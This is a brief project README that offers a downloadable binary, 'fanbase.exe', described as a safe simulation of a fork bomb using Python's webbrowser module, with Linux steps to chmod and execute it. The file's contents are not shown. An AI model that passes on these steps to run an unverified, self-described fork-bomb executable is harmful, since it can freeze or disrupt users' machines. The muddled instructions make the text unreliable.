# download-boomboocat
This is a safe simulation of a fork bomb using webbrowser on python. This will only work on Linux computers. To make it work, you must download it, type chmod +x fanbase.exe, run it and then type ./fanbase.exe on your Linux terminal.
Before you do that, you should make a new directory and insert the file you downloaded.
Then, go to your Linux terminal and type "cd (whateveryourfoldernameis)". 
And then you run the code I told you before.
The simulation will hopefully work. Windows or Mac users will not be able to run this file. Linux Chromebook or normal Linux users only.
Scroll down to the releases part on this page to download the file.
You will see a file called "fanbase.exe". Click on it to download the file.
